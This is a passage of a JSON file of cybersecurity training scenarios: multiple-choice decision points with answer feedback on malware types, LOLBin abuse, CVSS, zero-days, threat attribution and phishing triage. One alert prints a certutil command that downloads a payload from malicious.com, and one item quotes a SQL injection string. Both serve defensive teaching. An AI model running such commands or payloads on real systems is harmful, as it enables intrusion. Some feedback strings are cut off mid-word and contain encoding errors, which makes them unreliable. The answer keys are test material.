'detailed': \"Registry keys used for persistence are important for cleaning up infected systems, but they're not 'blockable' in the traditional sense - you remove them during remediation. The registry key path is useful for hunting but not for immediate network-level blocking.\", 'consequence': 'Registry key documented for cleanup. C2 communication continues unchecked.'}"}, {"id": "D", "text": "All indicators equally - comprehensive blocking is best", "is_optimal": false, "feedback": "{'short': 'Prioritization matters for immediate response', 'detailed': 'All indicators are valuable, but immediate response requires prioritization. C2 IP can be blocked at the firewall in minutes to disrupt active attacks. Hashes take time to deploy to all endpoints. Registry keys require system-by-system remediation. Block C2 first, then address other indicators.', 'consequence': 'Time spent on comprehensive approach while C2 communication continues.'}"}]}, {"id": "decision_3", "title": "Worm vs Other Malware", "situation": "Dr. Chen presents a scenario: 'A hospital network is hit: within 2 hours, 500 computers display ransom notes. The malware exploited EternalBlue (MS17-010) to spread from the initial infected machine to all others automatically. No user interaction was required after the first infection. What type of malware is this?'", "question": "What type of malware caused this rapid spread across the hospital network?", "options": [{"id": "A", "text": "Ransomware - it encrypted files and demanded ransom", "is_optimal": false, "feedback": "{'short': 'Ransomware describes the payload, not the propagation', 'detailed': \"The malware IS ransomware (it encrypts and demands payment), but the question asks about the TYPE based on behavior. The key characteristic here is AUTOMATIC PROPAGATION via vulnerability exploitation without user interaction. That's the defining characteristic of a worm. This is a ransomware worm - it combines worm propagation with ransomware payload.\", 'consequence': 'Focus on ransomware response without addressing"}, {"id": "B", "text": "Worm - it spreads automatically by exploiting vulnerabilities", "is_optimal": true, "feedback": "{'short': 'Correct! Self-propagation via exploit = worm', 'detailed': 'This describes WannaCry - a ransomware WORM. The defining characteristic of a worm is self-propagation without user interaction, typically by exploiting vulnerabilities. This malware exploited EternalBlue (SMB vulnerability) to spread automatically across the network. The ransomware payload is what it does; the worm is how it spreads.', 'consequence': 'Correct classification prioritizes patching and network segmentation to st"}, {"id": "C", "text": "Trojan - it was delivered via initial infection", "is_optimal": false, "feedback": "{'short': \"Trojans don't self-propagate\", 'detailed': \"The INITIAL infection might have been via trojan (user opening malicious file), but the spread to 500 machines wasn't via 500 users opening files - it was automatic exploitation. Trojans require user action for each infection. Self-propagation via vulnerability = worm.\", 'consequence': 'Focus on user awareness when the propagation is vulnerability-based.'}"}, {"id": "D", "text": "Botnet - it affected many computers", "is_optimal": false, "feedback": "{'short': 'Botnet describes coordinated control, not propagation method', 'detailed': 'A botnet is a network of compromised computers under attacker control - it describes the END STATE, not the propagation method. Botnets CAN be built by worms, trojans, or other methods. The question asks about the type based on HOW it spread - automatic vulnerability exploitation = worm.', 'consequence': 'Confusing malware type with infection outcome.'}"}]}, {"id": "decision_4", "title": "Behavioral Indicator Analysis", "situation": "'Let's look at behaviors,' Dr. Chen says. 'Your EDR flags this sequence: Word.exe \u00e2\u2020\u2019 PowerShell.exe \u00e2\u2020\u2019 encoded command \u00e2\u2020\u2019 downloads file from internet \u00e2\u2020\u2019 creates scheduled task \u00e2\u2020\u2019 connects to external IP every 4 hours. What behavior pattern is this describing?'", "question": "What malware behavior pattern does this sequence represent?", "options": [{"id": "A", "text": "Data exfiltration - stealing information from the system", "is_optimal": false, "feedback": "{'short': 'No data theft indicators in this sequence', 'detailed': 'Data exfiltration would show: accessing sensitive files, staging/compressing data, uploading large amounts of data. This sequence shows: initial execution, download (inbound, not outbound), persistence (scheduled task), and C2 beacon (periodic contact, not bulk transfer). This is establishing access, not stealing data.', 'consequence': 'Focus on DLP when the issue is initial access and persistence.'}"}, {"id": "B", "text": "Initial access and persistence with C2 beacon", "is_optimal": true, "feedback": "{'short': 'Correct! Classic initial infection establishing foothold', 'detailed': 'This shows the classic infection chain: Initial Access (Word macro \u00e2\u2020\u2019 PowerShell), Execution (encoded command downloads payload), Persistence (scheduled task ensures survival), and C2 (periodic beacon every 4 hours maintains communication). This is an attacker establishing their foothold and maintaining access for future operations.', 'consequence': 'Correct identification enables complete remediation: remove per"}, {"id": "C", "text": "Lateral movement - spreading to other systems", "is_optimal": false, "feedback": "{'short': 'No indication of spreading to other systems', 'detailed': 'Lateral movement would show: credential theft, authentication to other systems, RDP/SMB connections to other hosts. This sequence is all about establishing foothold on ONE system: executing payload, creating persistence, establishing C2. Lateral movement typically comes after this initial foothold is established.', 'consequence': \"Hunt for lateral movement that hasn't happened yet while initial access continues.\"}"}, {"id": "D", "text": "Ransomware deployment - preparing to encrypt", "is_optimal": false, "feedback": "{'short': 'No encryption indicators present', 'detailed': \"Ransomware deployment would show: shadow copy deletion, mass file modification, ransom note creation. This sequence shows initial access and persistence - these might LEAD to ransomware eventually, but what we're seeing here is establishing the foothold. The 4-hour beacon suggests ongoing access, not imminent encryption.\", 'consequence': 'Expect ransomware immediately when this is early-stage access.'}"}]}, {"id": "decision_5", "title": "Living Off the Land Detection", "situation": "Dr. Chen shows an alert: 'Process: certutil.exe, Command: certutil -urlcache -split -f http://malicious.com/payload.exe C:\\Windows\\Temp\\update.exe, Parent: cmd.exe, Grandparent: Excel.exe. Is this malicious?'", "question": "Is this certutil activity malicious?", "options": [{"id": "A", "text": "No - certutil is a legitimate Windows tool", "is_optimal": false, "feedback": "{'short': 'Legitimate tools can be abused', 'detailed': \"Certutil IS a legitimate Windows tool for certificate management. However, it's being ABUSED here to download a file from the internet - the '-urlcache' parameter turns it into a file downloader. The process ancestry (Excel \u00e2\u2020\u2019 cmd \u00e2\u2020\u2019 certutil downloading from external URL) is classic Living Off the Land abuse. Legitimacy of the tool doesn't mean legitimate use.\", 'consequence': \"Malicious activity missed because the tool is 'legitimate.'"}, {"id": "B", "text": "Yes - LOLBin abuse: certutil downloading file, spawned from Excel via cmd", "is_optimal": true, "feedback": "{'short': 'Correct! Classic LOLBin abuse pattern', 'detailed': \"This is textbook LOLBin (Living Off the Land Binary) abuse: Excel (macro) \u00e2\u2020\u2019 cmd \u00e2\u2020\u2019 certutil downloading from internet. Certutil's -urlcache parameter is commonly abused to download malware while bypassing application whitelisting (certutil is signed by Microsoft). The process chain and external URL download make this clearly malicious.\", 'consequence': 'Correct identification enables blocking this technique and investigating the "}, {"id": "C", "text": "Need more information - could be legitimate admin activity", "is_optimal": false, "feedback": "{'short': 'Process ancestry tells us enough', 'detailed': \"The process ancestry is conclusive: Excel spawning cmd spawning certutil to download from external URL is NOT legitimate admin activity. Admins don't use Excel to run certutil to download files. This is a malicious macro using LOLBins. The pattern itself is the indicator - no additional context needed.\", 'consequence': 'Delay investigation while gathering unnecessary context.'}"}, {"id": "D", "text": "Suspicious but not conclusive - monitor for further activity", "is_optimal": false, "feedback": "{'short': 'This IS conclusive - act now', 'detailed': \"This pattern is conclusive for malicious activity. Excel \u00e2\u2020\u2019 cmd \u00e2\u2020\u2019 certutil -urlcache to external URL is a known malicious pattern. Waiting to 'monitor for further activity' means letting the downloaded payload execute. Investigate and remediate immediately.\", 'consequence': \"Payload executes while waiting for 'further activity.'\"}"}]}], "passing_score": 70, "max_score": 100}, {"id": "D2-REM-003", "domain": 2, "type": "REM", "title": "Vulnerability Deep Dive", "difficulty": "foundational", "role": "Security Analyst", "organization": {"name": "SecureLearn Training Institute"}, "introduction": "Welcome to the Vulnerability Management fundamentals course. Marcus greets you at the training center. 'Understanding vulnerabilities - what they are, how to assess their severity, and how to prioritize remediation - is fundamental to protecting any organization. Today we'll examine different vulnerability types, learn CVSS scoring, and practice making tough prioritization decisions. By the end, you'll be able to look at scan results and know exactly what needs attention first.'", "decision_points": [{"id": "decision_1", "title": "Basic Vulnerability Classification", "situation": "Marcus starts with fundamentals. 'A web application has a flaw where user input in a search field is directly inserted into a database query without sanitization. An attacker enters: ' OR '1'='1 and retrieves all records. What type of vulnerability is this?'", "question": "What type of vulnerability allows this attack?", "options": [{"id": "A", "text": "Cross-Site Scripting (XSS) - injecting malicious code", "is_optimal": false, "feedback": "{'short': 'XSS involves injecting JavaScript, not SQL', 'detailed': \"XSS involves injecting malicious JavaScript that executes in victims' browsers. This attack injects SQL code that executes on the database server. The target (database vs. browser) and the language (SQL vs. JavaScript) distinguish these vulnerabilities.\", 'consequence': \"Wrong mitigation focus - XSS defenses won't prevent SQL injection.\"}"}, {"id": "B", "text": "SQL Injection - inserting SQL code via user input", "is_optimal": true, "feedback": "{'short': 'Correct! Classic SQL injection attack', 'detailed': \"This is SQL Injection (SQLi): user input is incorporated directly into SQL queries without proper sanitization or parameterization. The payload ' OR '1'='1 modifies the query logic to return all records. SQLi can lead to data theft, authentication bypass, and even command execution on the database server.\", 'consequence': 'Correct identification enables proper remediation: parameterized queries, input validation, WAF rules.'}"}, {"id": "C", "text": "Buffer Overflow - exceeding memory allocation", "is_optimal": false, "feedback": "{'short': 'Buffer overflow involves memory, not query manipulation', 'detailed': \"Buffer overflow occurs when data exceeds allocated memory bounds, potentially overwriting adjacent memory and enabling code execution. This attack manipulates query LOGIC, not memory. The input isn't too long - it's SQL code designed to change query behavior.\", 'consequence': 'Completely wrong vulnerability category.'}"}, {"id": "D", "text": "Insecure Direct Object Reference (IDOR) - accessing unauthorized records", "is_optimal": false, "feedback": "{'short': 'IDOR involves manipulating object identifiers', 'detailed': 'IDOR involves accessing objects by manipulating identifiers (like changing user ID from 123 to 124). While the RESULT might be similar (accessing unauthorized data), the METHOD is different. IDOR manipulates legitimate parameters; SQLi injects code that changes query behavior.', 'consequence': 'Different attack vector requires different defenses.'}"}]}, {"id": "decision_2", "title": "CVSS Score Interpretation", "situation": "'Understanding CVSS is essential,' Marcus explains. 'Here's a vulnerability: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H with a score of 9.8 Critical. What does this vector string tell us about the vulnerability?'", "question": "What does this CVSS 9.8 vector string indicate?", "options": [{"id": "A", "text": "Local vulnerability requiring physical access and user interaction", "is_optimal": false, "feedback": "{'short': 'Vector shows opposite - network exploitable, no user interaction', 'detailed': 'The vector shows: AV:N (Network - remote exploitation), PR:N (No Privileges required), UI:N (No User Interaction needed). Physical access and user interaction would lower the score significantly. This vulnerability is remotely exploitable without any prerequisites.', 'consequence': 'Misunderstanding vulnerability accessibility.'}"}, {"id": "B", "text": "Network exploitable, no authentication required, full system compromise possible", "is_optimal": true, "feedback": "{'short': 'Correct! Critical remote vulnerability', 'detailed': 'The vector indicates: AV:N (Network - remote), AC:L (Low complexity - easy), PR:N (No privileges - unauthenticated), UI:N (No user interaction), C:H/I:H/A:H (High impact to Confidentiality, Integrity, Availability). This is the worst case: easy remote exploitation with complete system compromise. This is why it scores 9.8 Critical.', 'consequence': 'Correct understanding enables proper prioritization - this is Tier 1 immediate.'}"}, {"id": "C", "text": "Medium severity requiring authenticated access", "is_optimal": false, "feedback": "{'short': 'PR:N means NO privileges required', 'detailed': \"PR:N specifically means 'Privileges Required: None' - the attacker doesn't need any authentication. The 9.8 score is Critical, not Medium. Medium would be 4.0-6.9. This vulnerability is extremely severe.\", 'consequence': 'Underestimating critical vulnerability severity.'}"}, {"id": "D", "text": "High severity but only affects confidentiality", "is_optimal": false, "feedback": "{'short': 'C:H/I:H/A:H means all three CIA components are impacted', 'detailed': 'The impact metrics C:H/I:H/A:H indicate HIGH impact to Confidentiality AND Integrity AND Availability. This means complete compromise of all three security pillars - not just confidentiality. Full CIA impact is why the score is so high.', 'consequence': 'Underestimating the scope of potential impact.'}"}]}, {"id": "decision_3", "title": "Zero-Day Understanding", "situation": "Marcus presents a scenario: 'Your threat intelligence team alerts you: a new vulnerability has been discovered in your firewall vendor's software. It's being actively exploited by attackers. The vendor is aware but has not released a patch. What type of vulnerability is this?'", "question": "What type of vulnerability is this?", "options": [{"id": "A", "text": "Known vulnerability - vendor is aware of it", "is_optimal": false, "feedback": "{'short': 'Known but unpatched with active exploitation = zero-day', 'detailed': \"While the vendor now knows about it, the defining characteristic is that NO PATCH EXISTS while it's being actively exploited. A 'known vulnerability' typically implies a patch is available. This is specifically a zero-day: the vendor has had 'zero days' to prepare defenses for their customers.\", 'consequence': 'Waiting for patch when immediate compensating controls are needed.'}"}, {"id": "B", "text": "Zero-day vulnerability - actively exploited with no available patch", "is_optimal": true, "feedback": "{'short': 'Correct! Zero-day = exploited before patch exists', 'detailed': \"This is a zero-day vulnerability: it's being actively exploited 'in the wild' and no patch is available. The name comes from the vendor having 'zero days' to fix the issue before attacks began. Zero-days require immediate compensating controls (isolation, monitoring, workarounds) since patching isn't possible.\", 'consequence': 'Correct identification triggers emergency response procedures and compensating control impleme"}, {"id": "C", "text": "Legacy vulnerability - affecting older software", "is_optimal": false, "feedback": "{'short': 'Legacy refers to old/unsupported systems', 'detailed': \"Legacy vulnerabilities affect old systems that may no longer receive patches due to end-of-life. This scenario describes a CURRENT product where the vendor IS working on a fix but hasn't released it yet. The defining issue is active exploitation before patch availability = zero-day.\", 'consequence': 'Wrong categorization delays appropriate response.'}"}, {"id": "D", "text": "Theoretical vulnerability - no active exploitation yet", "is_optimal": false, "feedback": "{'short': 'Scenario explicitly states active exploitation', 'detailed': \"The scenario states it's 'being actively exploited by attackers.' That's not theoretical - it's real-world attacks happening now. Active exploitation with no patch is the definition of a zero-day. Theoretical would mean the vulnerability was found but no exploits exist.\", 'consequence': 'Underestimating active threat.'}"}]}, {"id": "decision_4", "title": "Risk-Based Prioritization", "situation": "'CVSS alone doesn't tell the whole story,' Marcus explains. 'You have two vulnerabilities: Vuln A is CVSS 9.8 on an internal test server with no production data. Vuln B is CVSS 7.5 on your internet-facing payment processing system. Which should you prioritize?'", "question": "Which vulnerability should be prioritized for immediate remediation?", "options": [{"id": "A", "text": "Vuln A (CVSS 9.8) - higher severity always means higher priority", "is_optimal": false, "feedback": "{'short': \"CVSS doesn't account for business context\", 'detailed': \"CVSS measures technical severity in isolation, not actual business risk. A CVSS 9.8 on an isolated test server with no data represents LOW actual risk - there's nothing valuable to compromise and limited attack surface. CVSS must be combined with asset criticality and exposure to determine priority.\", 'consequence': 'Resources spent on low-risk system while high-risk system remains vulnerable.'}"}, {"id": "B", "text": "Vuln B (CVSS 7.5 on payment system) - business context makes it higher risk", "is_optimal": true, "feedback": "{'short': 'Correct! Risk = CVSS + Asset Criticality + Exposure', 'detailed': 'True risk considers: vulnerability severity (CVSS), asset criticality (payment system = critical), and exposure (internet-facing = maximum exposure). Vuln B on a critical, exposed system represents much higher actual risk than Vuln A on a low-value, internal system. Risk-based prioritization accounts for business context.', 'consequence': 'Correct prioritization protects critical business assets first.'}"}, {"id": "C", "text": "Both equally - both are high severity", "is_optimal": false, "feedback": "{'short': 'Resources are limited - prioritization is necessary', 'detailed': \"In theory, both should be fixed. In practice, resources are limited and you must prioritize. 'Both equally' isn't helpful when you have to choose what to fix first. The payment system represents significantly higher business risk and should be addressed before the test server.\", 'consequence': 'Lack of prioritization leads to inefficient resource allocation.'}"}, {"id": "D", "text": "Neither - wait for more vulnerabilities to batch together", "is_optimal": false, "feedback": "{'short': 'High severity vulnerabilities require prompt action', 'detailed': \"Both vulnerabilities are high severity and require action. 'Batching' might make sense for low-severity findings, but CVSS 7.5+ vulnerabilities, especially on critical systems, need prompt remediation. Waiting increases exposure time and risk of exploitation.\", 'consequence': 'Delayed remediation increases exposure to attack.'}"}]}, {"id": "decision_5", "title": "Exploit Availability Impact", "situation": "Marcus continues: 'Two vulnerabilities both scored CVSS 8.0. Vuln X has a Metasploit module available. Vuln Y has only a theoretical advisory from the vendor. How does exploit availability affect prioritization?'", "question": "How should exploit availability affect your prioritization?", "options": [{"id": "A", "text": "No effect - CVSS score is what matters for priority", "is_optimal": false, "feedback": "{'short': 'Exploit availability significantly increases likelihood', 'detailed': \"CVSS base score doesn't account for whether exploits exist. A vulnerability with a weaponized Metasploit module can be exploited by anyone with basic skills, dramatically increasing likelihood of attack. Exploit availability is a critical prioritization factor beyond CVSS.\", 'consequence': 'Equal treatment when actual risk levels are very different.'}"}, {"id": "B", "text": "Vuln X (Metasploit) should be prioritized higher - weaponized exploit means imminent threat", "is_optimal": true, "feedback": "{'short': 'Correct! Weaponized exploits dramatically increase likelihood', 'detailed': 'When a vulnerability has a Metasploit module, exploitation is trivial - attackers literally click a button. This dramatically increases likelihood of attack compared to a theoretical vulnerability requiring custom exploit development. Exploit maturity is a key prioritization factor: actively exploited > weaponized > PoC > theoretical.', 'consequence': 'Correct prioritization addresses imminent threats first.'"}, {"id": "C", "text": "Vuln Y (theoretical) should be prioritized - get ahead before exploits appear", "is_optimal": false, "feedback": "{'short': 'Address current threats before potential future threats', 'detailed': 'While being proactive is good, when one vulnerability is actively weaponized and the other is theoretical, you must address the immediate threat first. Vuln X can be exploited RIGHT NOW by anyone. Vuln Y MIGHT be exploitable someday. Focus resources on current risk.', 'consequence': 'Ignoring active threat to address potential future threat.'}"}, {"id": "D", "text": "Both should be deprioritized - 8.0 isn't critical", "is_optimal": false, "feedback": "{'short': '8.0 is HIGH severity requiring prompt attention', 'detailed': \"CVSS 8.0 is HIGH severity (7.0-8.9 range). Combined with a weaponized exploit, Vuln X is extremely dangerous. Deprioritizing based on 'not critical' ignores that HIGH severity vulnerabilities with public exploits are frequently exploited in attacks.\", 'consequence': 'Leaving highly exploitable vulnerabilities unaddressed.'}"}]}], "passing_score": 70, "max_score": 100}, {"id": "D2-SIM-001", "domain": 2, "type": "SIM", "title": "The Attribution Puzzle", "difficulty": "intermediate", "role": "soc_analyst", "organization": {"name": "Meridian Energy Corporation"}, "introduction": "Meridian Energy Corporation, a regional power utility, has detected unusual network activity over the past 72 hours. Initial alerts suggest multiple intrusion attempts with varying sophistication levels. The CISO suspects they may be facing threats from multiple actor types simultaneously. Your job is to analyze the indicators, attribute the threats to likely actor categories, and recommend appropriate responses based on actor motivations and capabilities.", "decision_points": [{"id": "D2S1-DP-001", "title": "Cluster A Attribution", "situation": "You begin analyzing Cluster A - the port scanning and vulnerability probing from TOR exit nodes using known public exploits.", "question": "Based on the indicators, what threat actor type is MOST likely responsible for Cluster A?", "options": [{"id": "A", "text": "Nation-state APT conducting initial reconnaissance", "is_optimal": false, "feedback": "Nation-state actors typically conduct reconnaissance more stealthily. Using TOR exit nodes for noisy port scans and known public exploits doesn't match APT sophistication. They prefer custom tools and avoid detection, not broadcast their presence."}, {"id": "B", "text": "Script kiddies or automated scanning tools - opportunistic, unsophisticated", "is_optimal": true, "feedback": "Correct! The indicators point to low-sophistication actors: TOR for anonymity (common for amateurs), automated vulnerability scanning, known public exploits, no successful intrusions. This is typical opportunistic scanning that hits every internet-facing organization. Low priority but worth monitoring."}, {"id": "C", "text": "Cybercriminal group probing for ransomware deployment", "is_optimal": false, "feedback": "Sophisticated cybercriminal groups typically have more targeted initial access methods (phishing, purchased credentials, specific vulnerability exploitation). Mass scanning from TOR with public exploits is more consistent with unskilled actors or automated scanning services."}, {"id": "D", "text": "The GreenGrid Collective hacktivists conducting reconnaissance", "is_optimal": false, "feedback": "GreenGrid's activity (Cluster C) is separate and they announced their DDoS attack publicly. Hacktivists typically take credit for their actions. This scanning cluster shows no connection to the hacktivist campaign and is more consistent with general opportunistic scanning."}]}, {"id": "D2S1-DP-002", "title": "Cluster B Attribution", "situation": "You analyze Cluster B - the spearphishing campaign with custom malware targeting executives. The malware has zero AV detections and uses sophisticated C2 infrastructure.", "question": "Based on the indicators, what threat actor type is MOST likely responsible for Cluster B?", "options": [{"id": "A", "text": "Nation-state APT - sophisticated, targeted, matches CISA advisory", "is_optimal": true, "feedback": "Excellent analysis! Key indicators: spearphishing executives with industry-specific lures, custom malware with zero AV detection, C2 mimicking legitimate services, obfuscated PowerShell - all match the CISA advisory TTPs for state-sponsored actors targeting energy sector. This is your highest priority threat."}, {"id": "B", "text": "Sophisticated cybercriminal group preparing ransomware attack", "is_optimal": false, "feedback": "Cybercriminals capable of custom malware exist, but the targeting pattern (executives, industry-specific lures, SCADA interest) and correlation with CISA advisory suggest state-sponsored activity. Criminals typically want fast monetization, not infrastructure reconnaissance."}, {"id": "C", "text": "Advanced hacktivist group with nation-state backing", "is_optimal": false, "feedback": "GreenGrid Collective (active hacktivists in this scenario) doesn't demonstrate this level of sophistication. While some hacktivist groups have evolved, the indicators here match pure APT activity - long-term access, infrastructure reconnaissance, no public statements."}, {"id": "D", "text": "Insider threat - someone provided access to attackers", "is_optimal": false, "feedback": "While insiders can facilitate attacks, the indicators describe external spearphishing - executives received emails they clicked. The sophistication is in the external attacker's tools, not insider knowledge. The attack came from outside."}]}, {"id": "D2S1-DP-003", "title": "Cluster C Attribution", "situation": "You review Cluster C - the DDoS attack and defacement attempt accompanied by social media claims from 'GreenGrid Collective.'", "question": "Based on the indicators, what threat actor type and motivation is MOST likely for Cluster C?", "options": [{"id": "A", "text": "Hacktivists motivated by environmental ideology", "is_optimal": true, "feedback": "Correct! Clear hacktivist indicators: public announcement of attack, ideological messaging ('profits from destroying the planet'), DDoS and defacement (typical hacktivist tactics), known group with history of similar attacks. Motivation is making a political/environmental statement, not financial gain or espionage."}, {"id": "B", "text": "Cybercriminals using environmental messaging as cover", "is_optimal": false, "feedback": "Cybercriminals focus on monetization. DDoS with defacement and public statements doesn't generate revenue. GreenGrid has a documented history of environmental activism. The messaging is consistent with their ideology, not a cover for profit-seeking."}, {"id": "C", "text": "Nation-state conducting distracting attack while APT operates", "is_optimal": false, "feedback": "Interesting theory, but GreenGrid Collective is a known independent hacktivist group with consistent ideology. While the timing is notable (APT and hacktivists active simultaneously), there's no evidence of coordination. Sometimes multiple threats occur independently."}, {"id": "D", "text": "Competitor engaging in corporate sabotage", "is_optimal": false, "feedback": "Competitors typically don't conduct public DDoS attacks with environmental messaging - that would expose them to legal liability and reputational damage. This pattern is consistent with genuine ideological hacktivism."}]}, {"id": "D2S1-DP-004", "title": "Cluster D Attribution", "situation": "You analyze Cluster D - the internal user accessing engineering documents at unusual hours and downloading to USB. The user has a grievance with the company.", "question": "Based on the indicators, what threat actor type is MOST likely for Cluster D?", "options": [{"id": "A", "text": "Insider threat - disgruntled employee potentially preparing to leave or cause harm", "is_optimal": true, "feedback": "Correct! Classic insider threat indicators: legitimate user with authorized access, unusual access times (2:47 AM for day shift worker), bulk data download to removable media, recent grievance/dissatisfaction, job searching behavior. The access is legitimate but the pattern is suspicious."}, {"id": "B", "text": "Compromised account being used by external attacker", "is_optimal": false, "feedback": "Account compromise is possible, but the behavioral indicators (grievance, job searching, promotion denial) suggest the actual employee. External attackers using compromised accounts typically don't have the contextual knowledge to access specific engineering documents relevant to the user's job role."}, {"id": "C", "text": "Nation-state using an insider recruit for access", "is_optimal": false, "feedback": "While nation-states do recruit insiders, there's no evidence of foreign contact or recruitment. The simpler explanation fits: a disgruntled employee with grievances acting on their own. The documents accessed relate to his job function, not strategic intelligence targets."}, {"id": "D", "text": "Normal work activity - technicians sometimes work odd hours", "is_optimal": false, "feedback": "The combination of factors is too suspicious to dismiss: 2:47 AM access for someone who works 7am-3pm, bulk download to USB (against policy), recent grievance, and job searching. Any one factor might be explainable; together they indicate a problem."}]}, {"id": "D2S1-DP-005", "title": "Threat Prioritization", "situation": "You've attributed all four threat clusters. Now you need to prioritize response. Resources are limited - you can't address everything with equal intensity.", "question": "How should you PRIORITIZE these threats for response?", "options": [{"id": "A", "text": "Cluster C (Hacktivists) first - they're actively attacking and public", "is_optimal": false, "feedback": "Hacktivists are disruptive but typically limited in capability and impact. DDoS and defacement are annoying but recoverable. The APT (Cluster B) and insider (Cluster D) pose greater risks to critical infrastructure and sensitive data. Visibility shouldn't determine priority."}, {"id": "B", "text": "Cluster B (APT) first, then Cluster D (Insider), then C (Hacktivists), then A (Script kiddies)", "is_optimal": true, "feedback": "Excellent prioritization! APT is highest risk - sophisticated, targeting critical infrastructure, potential for long-term damage. Insider has legitimate access to sensitive systems - immediate risk of data theft. Hacktivists are disruptive but limited. Script kiddies are background noise handled by standard controls."}, {"id": "C", "text": "Cluster D (Insider) first - they have direct access to SCADA systems", "is_optimal": false, "feedback": "Good thinking about insider access, but the APT is specifically targeting SCADA reconnaissance and has already achieved initial access (exec clicked phishing). The APT's ultimate goal may be the same systems, with more sophisticated capabilities. APT slightly edges out insider for priority."}, {"id": "D", "text": "All threats equally - address them simultaneously", "is_optimal": false, "feedback": "Resource constraints make equal treatment impractical. More importantly, threats have genuinely different risk levels. APT capabilities far exceed script kiddies. Prioritization ensures the highest risks get the best resources. Equal treatment wastes resources on low-priority threats."}]}], "passing_score": 70, "max_score": 100}, {"id": "D2-SIM-001", "domain": 2, "type": "SIM", "title": "The Phishing Campaign", "difficulty": "intermediate", "role": "Security Analyst", "organization": {"name": "MedCare Regional Health Network"}, "introduction": "It's Tuesday morning at 7:42 AM when the Security Operations Center starts lighting up. Three separate users from the Finance department have reported suspicious emails claiming to be from the CFO requesting urgent wire transfers. Within 20 minutes, you've received seven more reports from various departments - HR, Patient Billing, and the Executive Assistant pool. The emails appear highly targeted, referencing specific internal projects and using proper formatting that mirrors legitimate internal communications. Your SOC Lead assigns you as primary analyst for this incident. Initial triage sug", "decision_points": [{"id": "decision_1", "title": "Initial Triage Priority", "situation": "You have three email samples reported within 25 minutes, all impersonating different C-suite executives. The SOC Lead wants your initial assessment: what's the first thing you need to determine to understand the scope of this threat?", "question": "What should be your PRIMARY initial triage focus?", "options": [{"id": "A", "text": "Verify whether the executives actually sent these emails by calling them directly", "is_optimal": false, "feedback": "{'short': 'Helpful but not the priority', 'detailed': \"While confirming with executives is good practice, the email headers already show these came from lookalike domains (reg1onal vs regional). Your priority should be understanding the campaign's scope - how many people received these emails and whether anyone has interacted with them.\", 'consequence': 'You spend 15 minutes reaching executives while potentially compromised users continue interacting with malicious emails.'}"}, {"id": "B", "text": "Perform a message trace to identify ALL recipients of emails from these sender domains", "is_optimal": true, "feedback": "{'short': 'Excellent! Scope identification is critical', 'detailed': 'Identifying the full scope of the campaign is essential. A message trace across your email security platform will reveal every user who received emails from these malicious domains, allowing you to understand the attack surface, identify potential victims, and prioritize containment actions. This data drives all subsequent response decisions.', 'consequence': 'You quickly identify 47 targeted users across multiple departments "}, {"id": "C", "text": "Immediately block the sending domains at the email gateway", "is_optimal": false, "feedback": "{'short': 'Important but premature', 'detailed': \"Blocking is definitely needed, but doing it before understanding scope means you don't know who's already received emails. You need to trace first so you can identify users who need follow-up, then block to prevent additional delivery.\", 'consequence': 'Domains are blocked but you have no visibility into who already received and potentially clicked on malicious emails.'}"}, {"id": "D", "text": "Forward the samples to your threat intelligence vendor for analysis", "is_optimal": false, "feedback": "{'short': 'Useful but not time-critical', 'detailed': \"External threat intelligence analysis can provide valuable context but takes time. Your immediate priority during an active campaign is understanding internal scope and exposure. TI enrichment can happen in parallel but shouldn't delay response actions.\", 'consequence': 'You wait for external analysis while the attack window remains open.'}"}]}, {"id": "decision_2", "title": "Attack Vector Analysis", "situation": "Your message trace reveals 47 emails sent to personnel across Finance (18), HR (11), Executive (8), Patient Billing (6), and IT (4). Looking at the sender domains, you notice: medcare-reg1onal.com, medcare-regi0nal.com, and medcare-reglonal.com. All registered within the past week.", "question": "What type of attack technique are these domains demonstrating?", "options": [{"id": "A", "text": "Domain hijacking - the attackers compromised MedCare's legitimate domain", "is_optimal": false, "feedback": "{'short': \"Incorrect - the legitimate domain wasn't compromised\", 'detailed': \"Domain hijacking would mean the attackers gained control of medcare-regional.com itself. These are different domains entirely - they use character substitution (1 for i, 0 for o, l for i) to create visually similar but distinct domains. The legitimate domain remains under MedCare's control.\", 'consequence': 'Misidentifying the attack type could lead to unnecessary panic about domain compromise and misdirected response"}, {"id": "B", "text": "Typosquatting - registering domains with character substitutions to impersonate legitimate domains", "is_optimal": true, "feedback": "{'short': 'Correct! Classic typosquatting technique', 'detailed': 'Typosquatting (also called URL hijacking) involves registering domains that are visually similar to legitimate ones, typically using: character substitution (1/i, 0/o, l/i), adjacent key typos, added/removed characters, or different TLDs. These domains pass casual visual inspection, especially in email clients that may not display the full address.', 'consequence': 'Accurate identification allows you to search for additional typo"}, {"id": "C", "text": "Email header spoofing - forging the From address without registering domains", "is_optimal": false, "feedback": "{'short': 'Partially correct thinking, but different technique', 'detailed': 'Header spoofing involves forging email headers without owning the spoofed domain. In this case, the attackers actually registered similar-looking domains and configured proper mail infrastructure. This is more sophisticated than simple header spoofing because the emails legitimately originate from domains the attacker controls, potentially bypassing some email security checks.', 'consequence': \"Misunderstanding the tec"}, {"id": "D", "text": "DNS poisoning - redirecting DNS queries to attacker-controlled servers", "is_optimal": false, "feedback": "{'short': \"Incorrect - DNS infrastructure wasn't compromised\", 'detailed': 'DNS poisoning would involve corrupting DNS records or cache to redirect traffic. These attacks use legitimately registered lookalike domains with their own valid DNS records. No DNS infrastructure was compromised.', 'consequence': 'Investigating non-existent DNS compromise wastes critical time and resources.'}"}]}, {"id": "decision_3", "title": "Threat Actor Attribution", "situation": "Analysis reveals the campaign infrastructure: domains registered through NameCheap with privacy protection 4-5 days ago, hosted on Hostinger (Lithuania), emails personalized for each recipient using information that appears to come from LinkedIn and public sources. The targeting is exclusively focused on employees with financial transaction authority or access to sensitive HR data.", "question": "Based on these indicators, what type of threat actor is MOST likely behind this campaign?", "options": [{"id": "A", "text": "Nation-state actor conducting espionage operations", "is_optimal": false, "feedback": "{'short': 'Unlikely given the indicators', 'detailed': \"Nation-state actors typically focus on long-term persistent access for espionage purposes. They target intellectual property, state secrets, or strategic intelligence. This campaign's focus on financial personnel and wire transfer/payroll fraud indicates financial motivation rather than espionage. Nation-states also typically use more sophisticated infrastructure and may target specific individuals for intelligence value.\", 'consequence': '"}, {"id": "B", "text": "Organized cybercriminal group conducting Business Email Compromise", "is_optimal": true, "feedback": "{'short': 'Correct! Classic BEC indicators', 'detailed': 'This matches organized cybercrime patterns: financial motivation (wire transfers, gift cards), sophisticated but commodity infrastructure (privacy-protected registration, offshore hosting), extensive reconnaissance for social engineering, and targeting of finance/HR personnel. BEC groups invest in research to craft convincing pretexts and often operate 